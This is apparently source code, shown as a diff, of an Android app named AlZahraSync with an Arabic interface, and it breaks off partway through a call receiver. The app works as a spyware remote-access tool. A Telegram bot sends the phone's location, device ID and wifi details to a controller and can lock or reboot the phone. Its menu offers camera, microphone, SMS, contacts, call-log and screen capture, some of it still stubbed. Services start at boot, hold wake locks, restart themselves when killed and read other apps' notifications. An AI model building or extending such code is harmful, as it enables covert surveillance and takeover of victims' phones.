+package com.alzahra.telegram;
+
+import android.util.Log;
+
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+
+public class TelegramAPI {
+    private static final String TAG = "TelegramAPI";
+
+    public static void sendMessage(String botToken, String chatId, String message) {
+        new Thread(() -> {
+            try {
+                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                String params = "chat_id=" + chatId + 
+                                "&text=" + URLEncoder.encode(message, "UTF-8") +
+                                "&parse_mode=HTML";
+                
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                
+                conn.getOutputStream().write(params.getBytes("UTF-8"));
+                conn.getOutputStream().flush();
+                conn.getOutputStream().close();
+                
+                int response = conn.getResponseCode();
+                Log.d(TAG, "Message sent, response: " + response);
+                conn.disconnect();
+            } catch (Exception e) {
+                Log.e(TAG, "Send error: " + e.getMessage());
+            }
+        }).start();
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/telegram/BotManager.java
+================================================
+
+package com.alzahra.telegram;
+
+import android.content.Context;
+import android.util.Log;
+
+import com.alzahra.data.CommandExecutor;
+import com.alzahra.data.CommandResult;
+import org.telegram.telegrambots.bots.TelegramLongPollingBot;
+import org.telegram.telegrambots.meta.TelegramBotsApi;
+import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
+import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
+import org.telegram.telegrambots.meta.api.objects.Update;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
+import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
+import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class BotManager {
+    private static final String TAG = "BotManager";
+    private final String botToken;
+    private final String chatId;
+    private final Context context;
+    private TelegramLongPollingBot bot;
+    private boolean isRunning = false;
+    private boolean isConnected = false;
+    private CommandExecutor executor;
+
+    public BotManager(String token, String chat, Context ctx) {
+        this.botToken = token;
+        this.chatId = chat;
+        this.context = ctx;
+        this.executor = new CommandExecutor(ctx, token, chat);
+    }
+
+    public void start() {
+        new Thread(() -> {
+            try {
+                TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
+                bot = createBot();
+                botsApi.registerBot(bot);
+                isRunning = true;
+                isConnected = true;
+                Log.d(TAG, "Bot started successfully");
+                sendStatusMessage("🟢 *تم إعادة الاتصال*\nالنظام جاهز للاستقبال");
+                sendDashboard();
+            } catch (Exception e) {
+                Log.e(TAG, "Bot start error: " + e.getMessage());
+                isConnected = false;
+            }
+        }).start();
+    }
+
+    public void stop() {
+        isRunning = false;
+        isConnected = false;
+    }
+
+    public boolean isConnected() {
+        return isConnected;
+    }
+
+    private TelegramLongPollingBot createBot() {
+        return new TelegramLongPollingBot() {
+            @Override
+            public String getBotToken() {
+                return botToken;
+            }
+
+            @Override
+            public String getBotUsername() {
+                return "AlZahraController";
+            }
+
+            @Override
+            public void onUpdateReceived(Update update) {
+                if (!isRunning) return;
+                if (update.hasMessage() && update.getMessage().hasText()) {
+                    String messageText = update.getMessage().getText();
+                    String userChatId = update.getMessage().getChatId().toString();
+                    if (!userChatId.equals(chatId)) {
+                        sendMessage("⛔ *غير مصرح لك*\nمعرفك: `" + userChatId + "`");
+                        return;
+                    }
+                    executeCommandWithFeedback(messageText);
+                }
+            }
+        };
+    }
+
+    private void executeCommandWithFeedback(String command) {
+        new Thread(() -> {
+            long startTime = System.currentTimeMillis();
+            String cmd = command.replace("/", "").trim();
+            SendMessage processingMsg = new SendMessage(chatId, "⏳ *جاري تنفيذ:* `" + cmd + "`...");
+            processingMsg.setParseMode("Markdown");
+            org.telegram.telegrambots.meta.api.objects.Message sentMsg = null;
+            try {
+                sentMsg = bot.execute(processingMsg);
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending processing message: " + e.getMessage());
+            }
+            
+            CommandResult result = executor.execute(command);
+            long duration = System.currentTimeMillis() - startTime;
+            String statusEmoji = result.success ? "✅" : "❌";
+            String statusText = result.success ? "نجاح" : "فشل";
+            
+            StringBuilder response = new StringBuilder();
+            response.append(statusEmoji).append(" *").append(statusText).append("*\\n\\n");
+            response.append("📝 *الأمر:* `").append(cmd).append("`\\n");
+            response.append("⏱️ *المدة:* ").append(duration).append("ms\\n\\n");
+            
+            if (result.success) {
+                if (result.data != null && !result.data.isEmpty()) {
+                    response.append("📊 *النتيجة:*\\n").append(result.data);
+                } else {
+                    response.append("✅ تم التنفيذ بنجاح");
+                }
+            } else {
+                response.append("❌ *خطأ:*\\n`").append(result.error).append("`");
+            }
+            
+            if (sentMsg != null) {
+                editMessage(sentMsg.getMessageId().toString(), response.toString());
+            } else {
+                sendMessage(response.toString());
+            }
+            
+            if (result.showDashboard) {
+                sendDashboard();
+            }
+        }).start();
+    }
+
+    public void sendDashboard() {
+        SendMessage message = new SendMessage(chatId, 
+            "🎛️ *لوحة التحكم المتكاملة*\\n\\n" +
+            "اختر أحد الأوامر من الأسفل:");
+        message.setParseMode("Markdown");
+        
+        ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
+        keyboard.setResizeKeyboard(true);
+        keyboard.setOneTimeKeyboard(false);
+        keyboard.setSelective(true);
+        
+        List<KeyboardRow> rows = new ArrayList<>();
+        
+        KeyboardRow row1 = new KeyboardRow();
+        row1.add(new KeyboardButton("📍 موقعي"));
+        row1.add(new KeyboardButton("📸 كاميرا"));
+        row1.add(new KeyboardButton("🎤 ميكروفون"));
+        rows.add(row1);
+        
+        KeyboardRow row2 = new KeyboardRow();
+        row2.add(new KeyboardButton("📱 معلومات الجهاز"));
+        row2.add(new KeyboardButton("🔋 البطارية"));
+        row2.add(new KeyboardButton("📶 الواي فاي"));
+        rows.add(row2);
+        
+        KeyboardRow row3 = new KeyboardRow();
+        row3.add(new KeyboardButton("💬 الرسائل"));
+        row3.add(new KeyboardButton("👥 جهات الاتصال"));
+        row3.add(new KeyboardButton("📞 سجل المكالمات"));
+        rows.add(row3);
+        
+        KeyboardRow row4 = new KeyboardRow();
+        row4.add(new KeyboardButton("📦 التطبيقات"));
+        row4.add(new KeyboardButton("📁 الملفات"));
+        row4.add(new KeyboardButton("📱 الشاشة"));
+        rows.add(row4);
+        
+        KeyboardRow row5 = new KeyboardRow();
+        row5.add(new KeyboardButton("🔒 قفل"));
+        row5.add(new KeyboardButton("🔓 فتح"));
+        row5.add(new KeyboardButton("🔄 إعادة تشغيل"));
+        rows.add(row5);
+        
+        KeyboardRow row6 = new KeyboardRow();
+        row6.add(new KeyboardButton("❓ مساعدة"));
+        row6.add(new KeyboardButton("🔄 تحديث"));
+        rows.add(row6);
+        
+        keyboard.setKeyboard(rows);
+        message.setReplyMarkup(keyboard);
+        
+        try {
+            bot.execute(message);
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send dashboard error: " + e.getMessage());
+        }
+    }
+
+    private void sendStatusMessage(String text) {
+        SendMessage message = new SendMessage(chatId, text);
+        message.setParseMode("Markdown");
+        try {
+            bot.execute(message);
+        } catch (Exception e) {
+            Log.e(TAG, "Send status error: " + e.getMessage());
+        }
+    }
+
+    private void sendMessage(String text) {
+        SendMessage message = new SendMessage(chatId, text);
+        message.setParseMode("Markdown");
+        try {
+            bot.execute(message);
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send message error: " + e.getMessage());
+        }
+    }
+    
+    private void editMessage(String messageId, String newText) {
+        try {
+            EditMessageText edit = new EditMessageText();
+            edit.setChatId(chatId);
+            edit.setMessageId(Integer.parseInt(messageId));
+            edit.setText(newText);
+            edit.setParseMode("Markdown");
+            bot.execute(edit);
+        } catch (Exception e) {
+            sendMessage(newText);
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/telegram/SimpleBot.java
+================================================
+
+package com.alzahra.telegram;
+
+import android.content.Context;
+import android.util.Log;
+
+import org.json.JSONObject;
+import org.telegram.telegrambots.bots.TelegramLongPollingBot;
+import org.telegram.telegrambots.meta.TelegramBotsApi;
+import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
+import org.telegram.telegrambots.meta.api.objects.Update;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
+import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
+import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
+
+public class SimpleBot {
+    private static final String TAG = "SimpleBot";
+    private final String botToken;
+    private final String chatId;
+    private final Context context;
+    private TelegramLongPollingBot bot;
+    private boolean running = false;
+
+    public SimpleBot(String token, String chat, Context ctx) {
+        this.botToken = token;
+        this.chatId = chat;
+        this.context = ctx;
+    }
+
+    public void start() {
+        try {
+            TelegramBotsApi api = new TelegramBotsApi(DefaultBotSession.class);
+            
+            bot = new TelegramLongPollingBot() {
+                @Override
+                public String getBotToken() {
+                    return botToken;
+                }
+
+                @Override
+                public String getBotUsername() {
+                    return "AlZahraBot";
+                }
+
+                @Override
+                public void onUpdateReceived(Update update) {
+                    if (update.hasMessage() && update.getMessage() != null && update.getMessage().hasText()) {
+                        handleMessage(update.getMessage().getText(), update.getMessage().getChatId().toString());
+                    }
+                }
+            };
+            
+            api.registerBot(bot);
+            running = true;
+            Log.d(TAG, "Bot registered successfully");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Bot registration error: " + e.getMessage());
+            throw new RuntimeException(e);
+        }
+    }
+    
+    public void stop() {
+        running = false;
+    }
+    
+    public boolean isRunning() {
+        return running;
+    }
+    
+    private void handleMessage(String text, String fromChatId) {
+        if (!fromChatId.equals(chatId)) {
+            sendText("⛔ غير مصرح!");
+            return;
+        }
+        
+        String cmd = text.toLowerCase().trim();
+        Log.d(TAG, "Command: " + cmd);
+        
+        // الأوامر
+        if (cmd.startsWith("/start") || cmd.contains("start") || cmd.contains("تحديث")) {
+            sendDashboard();
+            return;
+        }
+        
+        if (cmd.contains("موقعي") || cmd.contains("location")) {
+            sendLocation();
+        }
+        else if (cmd.contains("كاميرا") || cmd.contains("camera")) {
+            sendText("📸 جاري التقاط الصورة...");
+            // TODO: implement camera
+        }
+        else if (cmd.contains("ميكروفون") || cmd.contains("mic")) {
+            sendText("🎤 جاري تسجيل الصوت...");
+            // TODO: implement mic
+        }
+        else if (cmd.contains("معلومات") || cmd.contains("device")) {
+            sendDeviceInfo();
+        }
+        else if (cmd.contains("بطارية") || cmd.contains("battery")) {
+            sendBattery();
+        }
+        else if (cmd.contains("واي فاي") || cmd.contains("wifi")) {
+            sendWiFi();
+        }
+        else if (cmd.contains("رسائل") || cmd.contains("sms")) {
+            sendText("💬 جاري جمع الرسائل...");
+        }
+        else if (cmd.contains("جهات") || cmd.contains("contacts")) {
+            sendText("👥 جاري جمع جهات الاتصال...");
+        }
+        else if (cmd.contains("مكالمات") || cmd.contains("calls")) {
+            sendText("📞 جاري جمع سجل المكالمات...");
+        }
+        else if (cmd.contains("تطبيقات") || cmd.contains("apps")) {
+            sendText("📦 جاري جمع قائمة التطبيقات...");
+        }
+        else if (cmd.contains("ملفات") || cmd.contains("files")) {
+            sendText("📁 المسارات:\n/sdcard/Download\n/sdcard/Pictures");
+        }
+        else if (cmd.contains("شاشة") || cmd.contains("screen")) {
+            sendText("📱 جاري التقاط الشاشة...");
+        }
+        else if (cmd.contains("قفل") || cmd.contains("lock")) {
+            lockDevice();
+        }
+        else if (cmd.contains("فتح") || cmd.contains("unlock")) {
+            sendText("🔓 يتطلب صلاحيات إضافية");
+        }
+        else if (cmd.contains("إعادة") || cmd.contains("restart")) {
+            restartDevice();
+        }
+        else if (cmd.contains("مساعدة") || cmd.contains("help")) {
+            sendHelp();
+        }
+        else {
+            sendText("❓ أمر غير معروف\nاكتب /start للوحة التحكم");
+            sendDashboard();
+        }
+    }
+    
+    public void sendText(String message) {
+        new Thread(() -> {
+            try {
+                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                String params = "chat_id=" + chatId + "&text=" + URLEncoder.encode(message, "UTF-8") + "&parse_mode=Markdown";
+                
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+                conn.setDoOutput(true);
+                
+                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
+                wr.write(params.getBytes("UTF-8"));
+                wr.flush();
+                wr.close();
+                
+                int response = conn.getResponseCode();
+                conn.disconnect();
+                Log.d(TAG, "Message sent: " + response);
+            } catch (Exception e) {
+                Log.e(TAG, "Send error: " + e.getMessage());
+            }
+        }).start();
+    }
+    
+    public void sendDashboard() {
+        new Thread(() -> {
+            try {
+                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                
+                // بناء لوحة المفاتيح
+                String keyboardJson = "{" +
+                    "\"keyboard\":[" +
+                        "[{\"text\":\"📍 موقعي\"},{\"text\":\"📸 كاميرا\"},{\"text\":\"🎤 ميكروفون\"}]," +
+                        "[{\"text\":\"📱 معلومات الجهاز\"},{\"text\":\"🔋 البطارية\"},{\"text\":\"📶 واي فاي\"}]," +
+                        "[{\"text\":\"💬 الرسائل\"},{\"text\":\"👥 جهات الاتصال\"},{\"text\":\"📞 سجل المكالمات\"}]," +
+                        "[{\"text\":\"📦 التطبيقات\"},{\"text\":\"📁 الملفات\"},{\"text\":\"📱 الشاشة\"}]," +
+                        "[{\"text\":\"🔒 قفل\"},{\"text\":\"🔓 فتح\"},{\"text\":\"🔄 إعادة تشغيل\"}]," +
+                        "[{\"text\":\"❓ مساعدة\"}]" +
+                    "]," +
+                    "\"resize_keyboard\":true" +
+                "}";
+                
+                String params = "chat_id=" + chatId + 
+                    "&text=" + URLEncoder.encode("🎛️ *لوحة التحكم*\nاختر أمر:", "UTF-8") +
+                    "&parse_mode=Markdown" +
+                    "&reply_markup=" + URLEncoder.encode(keyboardJson, "UTF-8");
+                
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setConnectTimeout(10000);
+                conn.setDoOutput(true);
+                
+                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
+                wr.write(params.getBytes("UTF-8"));
+                wr.flush();
+                wr.close();
+                
+                conn.getResponseCode();
+                conn.disconnect();
+                Log.d(TAG, "Dashboard sent");
+            } catch (Exception e) {
+                Log.e(TAG, "Dashboard error: " + e.getMessage());
+            }
+        }).start();
+    }
+    
+    private void sendDeviceInfo() {
+        try {
+            String model = android.os.Build.MODEL;
+            String id = android.provider.Settings.Secure.getString(
+                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+            String androidVersion = android.os.Build.VERSION.RELEASE;
+            
+            sendText("📱 *معلومات الجهاز*\n\n" +
+                "📲 الطراز: `" + model + "`\n" +
+                "🤖 Android: `" + androidVersion + "`\n" +
+                "🔑 المعرف: `" + id.substring(0, Math.min(id.length(), 8)) + "...`");
+        } catch (Exception e) {
+            sendText("⚠️ خطأ: " + e.getMessage());
+        }
+    }
+    
+    private void sendBattery() {
+        try {
+            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
+            android.content.Intent battery = context.registerReceiver(null, ifilter);
+            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+            float pct = level * 100 / (float)scale;
+            
+            String status = pct > 80 ? "🟢 ممتازة" : pct > 50 ? "🟡 جيدة" : "🔴 ضعيفة";
+            sendText("🔋 *البطارية*\n\nالمستوى: `" + (int)pct + "%` " + status);
+        } catch (Exception e) {
+            sendText("⚠️ خطأ");
+        }
+    }
+    
+    private void sendWiFi() {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) 
+                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            String ssid = wm.getConnectionInfo().getSSID();
+            sendText("📶 *الواي فاي*\n\nالشبكة: " + ssid);
+        } catch (Exception e) {
+            sendText("⚠️ غير متصل");
+        }
+    }
+    
+    private void sendLocation() {
+        try {
+            android.location.LocationManager lm = (android.location.LocationManager)
+                context.getSystemService(Context.LOCATION_SERVICE);
+            android.location.Location loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
+            
+            if (loc != null) {
+                sendText("📍 *الموقع*\n\n" +
+                    "الخط: `" + loc.getLatitude() + "`\n" +
+                    "الطول: `" + loc.getLongitude() + "`\n" +
+                    "الدقة: `" + loc.getAccuracy() + " م`\n\n" +
+                    "[🗺 الخريطة](https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude() + ")");
+            } else {
+                sendText("📍 *الموقع*\n\nآخر موقع غير متاح");
+            }
+        } catch (Exception e) {
+            sendText("⚠️ خطأ في الموقع: " + e.getMessage());
+        }
+    }
+    
+    private void lockDevice() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
+                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            dpm.lockNow();
+            sendText("🔒 *تم قفل الجهاز*");
+        } catch (Exception e) {
+            sendText("⚠️ فشل القفل: " + e.getMessage());
+        }
+    }
+    
+    private void restartDevice() {
+        try {
+            java.lang.Runtime.getRuntime().exec("su -c reboot");
+            sendText("🔄 *جاري إعادة التشغيل...*");
+        } catch (Exception e) {
+            sendText("⚠️ يتطلب ROOT");
+        }
+    }
+    
+    private void sendHelp() {
+        sendText("📖 *الأوامر المتاحة:*\n\n" +
+            "📍 موقعي - الموقع الجغرافي\n" +
+            "📸 كاميرا - التقاط صورة\n" +
+            "🎤 ميكروفون - تسجيل صوت\n" +
+            "📱 معلومات الجهاز - بيانات الجهاز\n" +
+            "🔋 البطارية - حالة البطارية\n" +
+            "📶 واي فاي - معلومات الشبكة\n" +
+            "💬 الرسائل - SMS\n" +
+            "👥 جهات الاتصال - Contacts\n\n" +
+            "🎛️ لعرض الأزرار اضغط /start");
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/services/CoreService.java
+================================================
+
+package com.alzahra.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Intent;
+import android.os.Build;
+import android.os.IBinder;
+
+import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
+
+import com.alzahra.MainActivity;
+import com.alzahra.R;
+
+public class CoreService extends Service {
+    private static final String CHANNEL_ID = "core_service";
+    private static final int NOTIFICATION_ID = 1;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID, "Core Service", NotificationManager.IMPORTANCE_LOW);
+            getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Intent notificationIntent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
+            PendingIntent.FLAG_IMMUTABLE);
+
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle(getString(R.string.notification_title))
+            .setContentText(getString(R.string.notification_text))
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .setContentIntent(pendingIntent)
+            .setOngoing(true)
+            .build();
+
+        startForeground(NOTIFICATION_ID, notification);
+        return START_STICKY;
+    }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/services/NotificationService.java
+================================================
+
+package com.alzahra.services;
+
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+import android.os.Bundle;
+import android.util.Log;
+
+public class NotificationService extends NotificationListenerService {
+    private static final String TAG = "NotificationService";
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "Notification service created");
+    }
+
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        String packageName = sbn.getPackageName();
+        String title = sbn.getNotification().extras != null ? 
+            sbn.getNotification().extras.getString("android.title") : "Unknown";
+        String text = sbn.getNotification().extras != null ?
+            sbn.getNotification().extras.getCharSequence("android.text", "Empty").toString() : "Empty";
+
+        Log.d(TAG, String.format("Package: %s, Title: %s, Text: %s", packageName, title, text));
+    }
+
+    @Override
+    public void onNotificationRemoved(StatusBarNotification sbn) {
+        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/services/BotService.java
+================================================
+
+package com.alzahra.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.util.Log;
+
+import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
+
+import com.alzahra.MainActivity;
+import com.alzahra.R;
+import com.alzahra.telegram.SimpleBot;
+
+public class BotService extends Service {
+    private static final String TAG = "BotService";
+    private static final String CHANNEL_ID = "alzahra_channel";
+    private static final int NOTIFICATION_ID = 7777;
+    
+    private SimpleBot bot;
+    private PowerManager.WakeLock wakeLock;
+    private WifiManager.WifiLock wifiLock;
+    private Handler reconnectHandler;
+    private String botToken;
+    private String chatId;
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "=== BotService Created ===");
+        
+        // إنشاء قناة الإشعارات فوراً
+        createNotificationChannel();
+        
+        // الحصول على الأقفال
+        acquireWakeLocks();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "=== BotService Started ===");
+        
+        // استخراج البيانات
+        if (intent != null) {
+            botToken = intent.getStringExtra("token");
+            chatId = intent.getStringExtra("chat_id");
+        }
+        
+        if (botToken == null) {
+            botToken = MainActivity.BOT_TOKEN;
+            chatId = MainActivity.CHAT_ID;
+        }
+        
+        // بدء الإشعار المستمر فوراً
+        Notification notification = buildNotification();
+        startForeground(NOTIFICATION_ID, notification);
+        
+        // بدء البوت في Thread منفصل
+        startBotInBackground();
+        
+        // جدولة إعادة الاتصال
+        setupReconnect();
+        
+        return START_STICKY;
+    }
+    
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID, 
+                    "Al-Zahra Control",
+                    NotificationManager.IMPORTANCE_LOW);
+                channel.setDescription("Remote Control Service");
+                channel.setSound(null, null);
+                channel.enableLights(false);
+                channel.enableVibration(false);
+                
+                NotificationManager nm = getSystemService(NotificationManager.class);
+                if (nm != null) {
+                    nm.createNotificationChannel(channel);
+                    Log.d(TAG, "Notification channel created");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Channel creation error: " + e.getMessage());
+            }
+        }
+    }
+    
+    private Notification buildNotification() {
+        Intent intent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
+            PendingIntent.FLAG_IMMUTABLE);
+            
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Al-Zahra Control")
+            .setContentText("الخدمة نشطة - جاري الاستماع")
+            .setSmallIcon(android.R.drawable.ic_menu_preferences)
+            .setContentIntent(pendingIntent)
+            .setOngoing(true)
+            .setSilent(true)
+            .build();
+    }
+    
+    private void acquireWakeLocks() {
+        try {
+            // WakeLock
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlZahra::WakeLock");
+                wakeLock.acquire(60*60*1000L); // ساعة
+                Log.d(TAG, "WakeLock acquired");
+            }
+            
+            // WiFi Lock
+            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null) {
+                wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "AlZahra::WiFiLock");
+                wifiLock.acquire();
+                Log.d(TAG, "WiFiLock acquired");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "WakeLock error: " + e.getMessage());
+        }
+    }
+    
+    private void startBotInBackground() {
+        new Thread(() -> {
+            try {
+                Log.d(TAG, "Starting bot thread...");
+                
+                if (bot != null) {
+                    bot.stop();
+                }
+                
+                bot = new SimpleBot(botToken, chatId, this);
+                bot.start();
+                
+                Log.d(TAG, "Bot started successfully");
+                
+                // إرسال رسالة التفعيل
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    bot.sendText("🟢 *تم تفعيل البوت بنجاح!*\n\nالخدمة تعمل في الخلفية\nاضغط على أي زر للبدء");
+                    bot.sendDashboard();
+                }, 2000);
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Bot start error: " + e.getMessage());
+                sendCrashReport("Bot Start Error", e.getMessage());
+            }
+        }).start();
+    }
+    
+    private void setupReconnect() {
+        reconnectHandler = new Handler(Looper.getMainLooper());
+        Runnable reconnectRunnable = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (bot == null || !bot.isRunning()) {
+                        Log.d(TAG, "Reconnecting bot...");
+                        startBotInBackground();
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Reconnect error: " + e.getMessage());
+                }
+                reconnectHandler.postDelayed(this, 60000); // كل دقيقة
+            }
+        };
+        reconnectHandler.postDelayed(reconnectRunnable, 60000);
+    }
+    
+    private void sendCrashReport(String type, String error) {
+        try {
+            if (bot != null) {
+                bot.sendText("⚠️ *تقرير خطأ:*\nالنوع: " + type + "\nالخطأ: `" + error + "`");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send crash report: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "=== BotService Destroyed ===");
+        
+        try {
+            if (reconnectHandler != null) {
+                reconnectHandler.removeCallbacksAndMessages(null);
+            }
+            
+            if (bot != null) {
+                bot.stop();
+            }
+            
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+            }
+            
+            if (wifiLock != null && wifiLock.isHeld()) {
+                wifiLock.release();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Destroy error: " + e.getMessage());
+        }
+        
+        // إعادة التشغيل الفوري
+        try {
+            Intent restartIntent = new Intent(this, BotService.class);
+            restartIntent.putExtra("token", botToken);
+            restartIntent.putExtra("chat_id", chatId);
+            startService(restartIntent);
+        } catch (Exception e) {
+            Log.e(TAG, "Restart error: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        Log.d(TAG, "=== Task Removed - Restarting ===");
+        
+        try {
+            Intent restart = new Intent(this, BotService.class);
+            restart.putExtra("token", botToken);
+            restart.putExtra("chat_id", chatId);
+            startService(restart);
+        } catch (Exception e) {
+            Log.e(TAG, "Task remove restart error: " + e.getMessage());
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/receivers/BootReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.util.Log;
+
+import com.alzahra.services.BotService;
+import com.alzahra.services.CoreService;
+
+public class BootReceiver extends BroadcastReceiver {
+    private static final String TAG = "BootReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Log.d(TAG, "=== Boot Completed - Starting Services ===");
+            
+            // بدء الخدمة الأساسية
+            context.startService(new Intent(context, CoreService.class));
+            
+            // بدء خدمة البوت
+            Intent botIntent = new Intent(context, BotService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(botIntent);
+            } else {
+                context.startService(botIntent);
+            }
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/receivers/CallReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class CallReceiver extends BroadcastReceiver {
+    private static final String TAG = "CallReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+        
+        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
